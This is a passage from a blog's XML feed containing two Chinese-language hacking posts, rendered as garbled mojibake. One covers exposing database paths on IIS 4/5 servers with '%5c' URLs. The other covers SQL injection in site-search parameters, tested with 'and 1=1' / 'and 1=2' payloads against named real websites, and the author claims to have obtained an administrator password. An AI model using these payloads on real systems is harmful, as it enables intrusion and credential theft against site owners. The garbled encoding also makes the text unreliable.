    <content type="html"><![CDATA[<p>å…³äº%5cçš„æš´åº“åˆ©ç”¨æƒ³å·²ç»ä¸æ˜¯ä»€ä¹ˆæ–°æŠ€æœ¯äº†ï¼ŒåŸå› æˆ‘åªæ‰¾åˆ°å«ç³Šçš„è¯´æ³•ï¼šçš„UNICODEæ˜¯%5cå½“æäº¤æ—¶,IISæ— æ³•æ­£å¸¸è§£æ,å¯¼è‡´æš´åº“ã€‚ä½†æˆ‘å¯¹ <a href="http://www.hoky.org/">http://www.hoky.org</a> æµ‹è¯•æˆåŠŸåï¼ˆç°åœ¨å·²ç»è¡¥ä¸Šï¼‰é—®è¿‡hoky.proï¼Œå¾—çŸ¥%5cä¸IISçš„è®¾ç½®æ˜¯æœ‰å…³ç³»çš„ã€‚è€Œåœ¨é»˜è®¤è®¾ç½®ä¸‹æ˜¯å¯ä»¥æš´åº“çš„ã€‚è¿˜æœ‰å¾ˆå¤šäººè¯´ä¸æˆåŠŸï¼Œæˆ‘è¦è¯´çš„ä¸‰ç‚¹ï¼š</p><ol><li>ä¸€èˆ¬çš„é”™è¯¯è¿”å›é¡µé¢æ˜¯æœ¬åœ°IEæä¾›çš„,æ‰€ä»¥æˆ‘ä»¬å…ˆå¾—å…³äº†æœ¬åœ°çš„é”™è¯¯é¡µé¢,å…·ä½“åœ¨èœå•é¡¹çš„â€˜å·¥å…·-&gt;interneté€‰é¡¹-&gt;é«˜çº§-&gt;æ˜¾ç¤ºå‹å¥½ä¿¡æ¯â€™ã€‚</li><li>å¯¹æ–¹æ•°æ®åº“è¦æ˜¯Accesså‹ã€‚</li><li>%5cçš„æš´åº“éœ€è¦çš„æ˜¯äºŒçº§ç›®å½•ï¼Œä¸€çº§ç›®å½•æ— æ³•æˆåŠŸã€‚å¦‚ï¼š</li></ol><p><a href="http://www.sometips.com%5c1.asp?id=1">http://www.sometips.com%5c1.asp?id=1</a> ä¸æˆåŠŸ<br><a href="http://www.sometips.com/other%5c1.asp?id=1">http://www.sometips.com/other%5c1.asp?id=1</a> æˆåŠŸ</p><p>å¥½äº†ï¼Œä¸Šé¢è¯´çš„å¤§å®¶éƒ½çŸ¥é“ï¼Œå½“æ˜¯åºŸè¯ã€‚åœ¨æš´åº“è¿™ä¹ˆå¥½ç”¨çš„ä¸œè¥¿ä¸‹ï¼Œå¦‚æœä¸€ä¸ªç½‘ç«™åªæœ‰ä¸€çº§ç›®å½•çš„è¯ï¼Œéš¾é“å°±æ²¡æœ‰åŠæ³•äº†å—ï¼Ÿè¯´åˆ°é‡ç‚¹ï¼Œå…¶å®ä¸€çº§ç›®å½•æˆ‘ä»¬ä¹ŸåŒæ ·å¯ä»¥æˆåŠŸçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ ä¸€ä¸ªå¤šçº§ç›®å½•æ¥è¾¾åˆ°æš´åº“çš„ç›®çš„ã€‚</p><p><a href="http://www.target.com/noexists/..%5clist.asp?id=1">http://www.target.com/noexists/..%5clist.asp?id=1</a></p><p>è¿™æ ·å¤§å®¶å°±ä¼šæœ‰æ–°çš„æƒŠå–œäº†ï¼Œå‘µå‘µã€‚</p><p>è¡¥æ•‘æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨conn.aspé‡Œ åŠ å…¥æ•°æ®åº“æ–‡ä»¶çš„ä½ç½®åé¢åŠ ä¸Šè¿™å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">On Error Resume Next<br></code></pre></td></tr></table></figure><p>å°±å¯ä»¥äº†ã€‚</p><hr><p>ä»Šå¤©åœ¨é»‘åŸºåˆçœ‹åˆ°äº†å…³äºï¼…5cæš´åº“çš„æ–‡ç« ï¼Œè¿™æ‹›çœŸçš„å¾ˆç®¡ç”¨ï¼Œå¤§æ¦‚10ä¸ªç½‘ç«™é‡Œä¼šæœ‰ä¸€ä¸ªä¼šæš´åº“å§ã€‚</p><p>å…³äºè¿™ä¸ªæ¼æ´ã€‚ç»¿ç›Ÿæœ‰ç›¸å…³çš„èµ„æ–™ï¼š<br><a href="http://www.nsfocus.net/index.php?act=magazine&do=view&mid=952">http://www.nsfocus.net/index.php?act=magazine&amp;do=view&amp;mid=952</a></p><p>å‘µå‘µã€‚è™½ç„¶è¿™ä¸ªæˆ‘ä»¬è¿™ä¸ªæ¼æ´å‘µæš´åº“å…³ç³»ä¸æ˜¯å¾ˆå¤§ï¼Œ ä½†æ˜¯æ˜çœ¼äººè¿˜æ˜¯çœ‹çš„å‡ºç›¸å…³çš„åœ°æ–¹ï¼ŒIIS äºŒæ¬¡è§£ç ã€‚å¤§å®¶çŸ¥é“åœ¨ urlä¸­ <code>\</code> å’Œ <code>/</code> æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ <a href="http://www.example.com/abc/123.asp?id=5">http://www.example.com/abc/123.asp?id=5</a> å’Œ <a href="http://www.example.com/abc/123.asp?id=5">http://www.example.com/abc\123.asp?id=5</a> æ˜¯ä¸€æ ·çš„ã€‚</p><p>è€Œ <a href="http://www.example.com/abc%5c123.asp?id=5">http://www.example.com/abc%5c123.asp?id=5</a> ç»è¿‡ä¸€æ¬¡è§£ç åå˜æˆ <a href="http://www.example.com/abc/123.asp?id=5">http://www.example.com/abc\123.asp?id=5</a> è¿™é‡Œæ˜¯ä¸ä¼šå‡ºé”™çš„ã€‚</p><p>è€Œç»è¿‡ IIS äºŒæ¬¡è§£ç åå°±å˜æˆ <a href="http://www.example.com/abc%5c123.asp?id=5">http://www.example.com/abc%5c123.asp?id=5</a>, å¦‚æœæ•°æ®åº“è¿æ¥æ–‡ä»¶ç”¨çš„ç›¸å¯¹è·¯å¾„çš„è¯ã€‚HOO, æ‰¾ä¸åˆ°æ•°æ®åº“æ–‡ä»¶ï¼Œå½“ç„¶å°±å‡ºé”™äº†ã€‚è¿˜å¾ˆè€å®å‘¢ï¼Œè¿ç‰©ç†è·¯å¾„éƒ½å‡ºæ¥äº†ã€‚å¤§å®¶çœ‹ã€‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Microsoft JET Database Engine é”™è¯¯ &#x27;<span class="hljs-number">80004005</span>&#x27;<br><br>&#x27;D:\wwwroot\hell\wwwroot\data\abc.asp&#x27;ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„è·¯å¾„ã€‚ ç¡®å®šè·¯å¾„åç§°æ‹¼å†™æ˜¯å¦æ­£ç¡®ï¼Œä»¥åŠæ˜¯å¦è¿æ¥åˆ°æ–‡ä»¶å­˜æ”¾çš„æœåŠ¡å™¨ã€‚<br><br>/blog/conn.aspï¼Œè¡Œ<span class="hljs-number">29</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯æˆ‘æš´ Oblog æš´å‡ºæ¥çš„ï¼Œè¿™ä¸ªæœˆçš„é»‘é˜²å¤§å®¶éƒ½æœ‰çœ‹å§ã€‚(æ—©çŸ¥é“æˆ‘ä¹Ÿå»æŠ•ç¨¿äº†ï¼Œæˆ‘å‘ç°çš„æ¯”ä»–æ—©å¤šäº†ï¼Œéƒé—·)<br>å¾ˆå¤šäººéƒ½åœ¨åˆ†ææˆåŠŸçš„æ¡ä»¶ï¼Œå°±è±¡itbbsé‡Œçš„äººè®¨è®ºçš„ä¸€æ ·ã€‚(itbbsæœ€è¿‘æˆ‘æ€ä¹ˆä¸Šä¸å»å•Šï¼ŒçŸ¥é“å‘Šè¯‰æˆ‘)</p><p>sykkk è®¤ä¸ºï¼š</p><ol><li>æ˜¯æ•°æ®åº“è¿æ¥ä¸­æ²¡æœ‰åŠ å…¥å®¹é”™ä»£ç  æ‰€ä»¥å¯¼è‡´é”™è¯¯ä¸èƒ½è·³è¿‡è€Œæ´»ç”Ÿç”Ÿçš„æŠŠæ•°æ®æ–‡ä»¶è¿æ¥æš´å‡ºæ¥</li><li>å¯¹æ–¹çš„IISæ²¡æœ‰å…³é—­é”™è¯¯æç¤º åªè¦å…³äº†é”™è¯¯æç¤ºå°±ç®—ä½ æ€ä¹ˆæš´ä¹Ÿæ²¡æœ‰ç”¨</li><li>ä¸ä¸€å®šè¦2çº§ç›®å½• å¯ä»¥è‡ªå·±å¤Ÿé€ ä¸ªnoexists&#x2F;..%5Cçš„2çº§ç›®å½•</li><li>è¿˜æœ‰å°±æ˜¯ è¦æˆåŠŸä¸€å®šè¦è°ƒç”¨åˆ°æ•°æ®åº“ ä¸ä¸€å®šæ˜¯5c1.asp?id&#x3D;1 è¿™ç§ç±»åˆ«çš„</li></ol><p>å…¶å®è¿˜æœ‰ä¸€ä¸ªå¿…è¦æ¡ä»¶ä»–å¿˜äº†ï¼Œæ•°æ®åº“è¦ç›¸å¯¹è·¯å¾„ï¼Œç»å¯¹è·¯å¾„æ˜¯æš´ä¸å‡ºæ¥çš„ã€‚è¿˜æœ‰æˆ‘è¡¥å……ä¸€ç‚¹åº”è¯¥æ˜¯ IIS 4.0 æˆ–è€… IIS 5.0 ï¼ŒIIS 6 åº”è¯¥æ˜¯ä¸è¡Œäº†ã€‚</p><p>å…³äºäºŒçº§ç›®å½•ï¼Œæˆ‘åŒæ„sykkkçš„çœ‹æ³•ï¼Œæœ‰çš„äººè¯´ä¸€å®šæ˜¯äºŒçº§ç›®å½•ï¼Œå‘µå‘µï¼Œæˆ‘å¯ä»¥å‘Šè¯‰å¤§å®¶é‚£æ˜¯é”™è¯¯çš„ã€‚åº”è¯¥æ˜¯æœ€é è¿‘çš„aspæ–‡ä»¶çš„é‚£ä¸ª â€œ&#x2F;â€œ æ”¹æˆ â€œ%5câ€, åªæœ‰æœ‰è°ƒç”¨æ•°æ®åº“éƒ½æœ‰å¯èƒ½æš´åº“ã€‚å“ˆå“ˆï¼Œè¿˜æœ‰å½“ç„¶å¯¹æ–¹è¦æ²¡æœ‰å±è”½é”™è¯¯ä¿¡æ¯ï¼Œè¦ä¸ç„¶ä½ æ˜¯è‚¯å®šçœ‹ä¸åˆ°çš„ã€‚</p><p>æ€»ç»“ï¼šï¼…5cæš´åº“æˆåŠŸæ¡ä»¶</p><ol><li>å¯¹æ–¹æœåŠ¡å™¨ç”¨çš„æ˜¯ IIS 4.0 æˆ– IIS 5.0ï¼Œ å¹¶ä¸”æ²¡æœ‰å±è”½é”™è¯¯ä¿¡æ¯ã€‚</li><li>æ˜¯æ•°æ®åº“è¿æ¥ä¸­æ²¡æœ‰åŠ å…¥å®¹é”™ä»£ç  æ‰€ä»¥å¯¼è‡´é”™è¯¯ä¸èƒ½è·³è¿‡è€Œæ´»ç”Ÿç”Ÿçš„æŠŠæ•°æ®æ–‡ä»¶è¿æ¥æš´å‡ºæ¥ (On Error Resume Next)</li><li>åº”è¯¥æ˜¯Microsoft JET Database Engine æ–¹å¼</li><li>æ•°æ®åº“æ–‡ä»¶è°ƒç”¨ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„ï¼ï¼</li></ol><p>ä¸ä¸€å®šè¦æ±‚æ˜¯äºŒçº§ç›®å½•ã€‚ä¸‰çº§ä¹Ÿæ˜¯å¯ä»¥çš„(æˆ‘æœ‰æˆåŠŸè¿‡), äºŒçº§ç›®å½•æœ‰æ—¶å€™åå€’æ²¡æˆåŠŸã€‚è‡³äºè¿˜æœ‰æ„é€ äºŒçº§ç›®å½•ï¼Œæˆ‘æ˜¯æ²¡æˆåŠŸè¿‡ï¼Œå˜¿å˜¿ï¼Œåº”è¯¥æ˜¯é”™è¯¯çš„ã€‚ï¼šï¼‰</p><p>éšä¾¿ä¹Ÿå‘Šè¯‰å¤§å®¶ï¼Œaspx %5c ä¹Ÿæœ‰æ–‡ç« çš„ï¼Œè¿ç”¨ä¹Ÿå¾ˆå·§å¦™ï¼Œæƒ³çŸ¥é“å°± googleå§ã€‚^_^</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç«™å†…æœç´¢å†™æ³•çš„ä¸€ä¸ª SQL inject æ¼æ´</title>
    <link href="/cn/search_sql_injection/"/>
    <url>/cn/search_sql_injection/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘sql inject å¯æ˜¯è¯´æ˜¯çº¢éäº†æ•´ä¸ªä¸­å›½ï¼Œä¸çŸ¥é“å¤šå°‘ç½‘ç«™åœ¨sql inject é¢å‰è½°ç„¶å€’ä¸‹ï¼Œå…¶å® Sql inject åœ¨å›½å¤–æŠ€æœ¯å·²ç»å¾ˆæˆç†Ÿäº†ï¼Œè€Œå›½å†…åˆ™æ˜¯åœ¨è¿‘ä¸€ä¸¤å¹´å†…æ…¢æ…¢èµ°å‘æˆç†Ÿã€‚åœ¨ä¸€ä¸ªä¸ªæƒ¨ç—›çš„å®ä¾‹é¢å‰ï¼Œè„šæœ¬å·¥ä½œè€…ä¸å¾—ä¸é‡è§†èµ·æ¥ï¼Œæœ€å¥½çš„ä¾‹å­å°±æ˜¯åŠ¨ç½‘äº†ã€‚ç„¶è€Œä»Šå¤©è„šæœ¬æ˜¯ä¸æ˜¯å°±å¾ˆå®‰å…¨çš„å‘¢ã€‚è¯·çœ‹æˆ‘å¯¹å‡ ä¸ªå®‰å…¨ç«™ç‚¹çš„æµ‹è¯•ç»“æœã€‚ç»“æœæ˜¯ä»¤äººåƒæƒŠçš„ï¼Œ å½±å­é¹°ï¼Œ åå¤ï¼Œ é»‘å®¢åŠ¨ç”»å§ éƒ½å­˜åœ¨ç€è¿™ä¸ªç«™å†…æœç´¢çš„æ¼æ´ã€‚</p><p>è¯·çœ‹ä¸€æ®µå¸¸è§çš„ç«™å†…æœç´¢å†™æ³•ã€‚</p><p>ä¾‹ä¸€ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;form4&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;search.asp&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;25&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;txtfind&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;18&quot;</span> <span class="hljs-attr">onMouseOver</span>=<span class="hljs-string">&quot;javascript:this.select();&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;è¯·è¾“å…¥å¾…æŸ¥ä¿¡æ¯&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:#333333 1px solid;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">height</span>=<span class="hljs-string">5</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../images/left_2.gif&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">186</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;s1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span>&gt;</span>æ‰€æœ‰ç±»åˆ«<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span>ç½‘ç«™æ–°é—»<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;2&#x27;</span>&gt;</span>è¿›é˜¶æ•™ç¨‹<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;3&#x27;</span>&gt;</span>å®‰å…¨æ¼æ´<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;5&#x27;</span>&gt;</span>ç³»ç»Ÿé˜²èŒƒ<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;6&#x27;</span>&gt;</span>åŸåˆ›ä½œå“<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¿™æ®µæ¥è‡ªå½±å­é¹°å®‰å…¨ç½‘, ä¹Ÿè®¸çœ‹äº†äººè¯´æ²¡ä»€ä¹ˆçš„å•Šï¼Œæˆ‘ä¹Ÿæ˜¯è¿™ä¹ˆå†™çš„ï¼Œè¿™å’Œsql inject æœ‰ä»€ä¹ˆå…³ç³»å•Šã€‚<br>å…¶å®é—®é¢˜å°±å‡ºåœ¨è¿™, æœç´¢ç±»åˆ«çš„å€¼æ˜¯ä»å®¢æˆ·ç«¯è·å¾—çš„ï¼Œè€Œä¸”æ²¡æœ‰è¿‡æ»¤ã€‚é‚£ä¹ˆèªæ˜çš„ä½ æ˜¯å¦æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªurl  <code>http://www.cnhacker.cn/search.asp?s1=1</code>  å¾—åˆ°çš„ç»“æœæ˜¯ï¼š</p><p>é¡µé¢è¿”å›æ­£å¸¸ï¼Œå¾—åˆ°ä¸€å¤§å †çš„æœç´¢ç»“æœã€‚</p><p>æäº¤ <code>http://www.cnhacker.cn/search.asp?s1=1 and 1ï¼1</code> è¿”å›æ­£å¸¸<br>æäº¤ <code>http://www.cnhacker.cn/search.asp?s1=1 and 1ï¼2</code> æ²¡æœ‰æœç´¢åˆ°ä»»ä½•ç›¸å…³æ–‡ç«  ï¼Œè¯·é‡æ–°æœç´¢</p><p>å“ˆå“ˆï¼Œå¯ä»¥æ³¨å…¥ï¼åƒè¿™äº›å®‰å…¨ç«™ç‚¹å¯†ç ä¸€å®šnå˜æ€ï¼Œè¿˜æ˜¯ç”¨nbè·‘è·‘å§ã€‚åé¢ä¹Ÿè¯æ˜äº†æˆ‘çš„æƒ³æ³•æ˜¯æ­£ç¡®çš„å¯†ç nå˜æ€ï¼Œè¿˜å¥½æ²¡æ‰‹å·¥çŒœã€‚æ‹¿åˆ°äº†ç®¡ç†å‘˜çš„å¯†ç ï¼Œå°±æ˜¯æ‰¾ä¸åˆ°åå°éƒé—·ã€‚</p><p>ä¾‹äºŒï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=11&#x27;</span>&gt;</span>å®‰å…¨æ‰«æ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=12&#x27;</span>&gt;</span>å—…æ¢ç›‘å¬<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=13&#x27;</span>&gt;</span>åˆ†ææ£€æµ‹<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=14&#x27;</span>&gt;</span>å­—å…¸æ–‡æ¡£<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=15&#x27;</span>&gt;</span>åŠ å¯†ç ´è§£<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=16&#x27;</span>&gt;</span>æœ¨é©¬ç±»<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=17&#x27;</span>&gt;</span>QQç±»<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;Soft_Class.asp?ClassID=18&#x27;</span>&gt;</span>ç»¼åˆå·¥å…·<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç æ¥è‡ªé»‘å®¢åŠ¨ç”»å§ï¼Œä»¤äººåƒæƒŠçš„ç›´æ¥å°±æ˜¯<code>classID=</code> æ ¹æœ¬å°±æ²¡æœ‰è¿‡æ»¤ã€‚åˆ†æå®Œä¸Šé¢çš„ä»£ç ï¼Œå’Œå…¶ä»–çš„ä¸€äº›ä»£ç ç»¼åˆèµ·æ¥, æˆ‘ä»¬åˆå¯ä»¥æ„é€ è¿™æ ·çš„url:</p><p><a href="http://www.hack58.com/Soft_Search.asp?Field=SoftName&ClassID=8">http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8</a></p><p>ç»“æœè¿”å›ä¹Ÿæ˜¯ä¸€å®šå †çš„æœç´¢ç»“æœã€‚ã€‚ã€‚</p><p>æäº¤ <code>http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8 and 1ï¼1</code> è¿”å›æ­£å¸¸<br>æäº¤ <code>http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8 and 1ï¼2</code> äº§ç”Ÿé”™è¯¯çš„å¯èƒ½åŸå› ï¼š</p><p>HOOï¼Œæ¼æ´åˆå‡ºæ¥äº†ï¼</p><p>ä¾‹ä¸‰ï¼š</p><p>æ¥ä¸ªå¤§å®¶éƒ½çŸ¥é“çš„åå¤é»‘å®¢è”ç›Ÿï¼Œå‰æ®µæ—¶é—´è¿˜è¢«é»‘äº†ä¸€æ¬¡ã€‚è¿˜æ˜¯çœ‹ä»£ç å§ï¼Œå¬è¯´åå¤ç”¨çš„æ˜¯åŠ¨åŠ›çš„å•†ä¸šç‰ˆã€‚å¯ä»¥åå¤ä»Šå¤©åˆä¸Šä¸å»ï¼Œåæ­£åŸç†æ˜¯ç›¸åŒçš„ã€‚æˆ‘æŠŠæˆ‘æ„é€ å¥½çš„url ç»™å¤§å®¶çœ‹  </p><p><code>http://www.77169.org/soft1/search.asp?ss_name=winrar&amp;sor=01</code></p><p>æ¥ä¸‹æ¥è¦æ€ä¹ˆå‘æŒ¥å°±çœ‹ä½ ä»¬çš„äº†ã€‚</p><p>æ€»ç»“ï¼šè¿™ä¸ªæ¼æ´åº”è¯¥æœ‰ä¸€å®šçš„æ™®éæ€§ï¼Œé»‘çªé‡Œå®‰å…¨ç«™ç‚¹éƒ½æœ‰è¿™ä¸ªé—®é¢˜ï¼Œæ›´åˆ«è¯´æ˜¯å…¶ä»–ç«™ç‚¹äº†ã€‚æˆ–è®¸æœ‰äº›å¤§è™¾æ—©å°±å‘ç°äº†ï¼Œ<br>å°å¼Ÿå°±åœ¨è¿™çŒ®ä¸‘ä¸€ä¸‹äº†ï¼Œç¬¬ä¸€æ¬¡å†™æ–‡ç« ï¼Œæœ‰æ‰€å·®é”™åœ¨æ‰€éš¾å…ï¼Œæ¬¢è¿å’Œæˆ‘è”ç³»ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
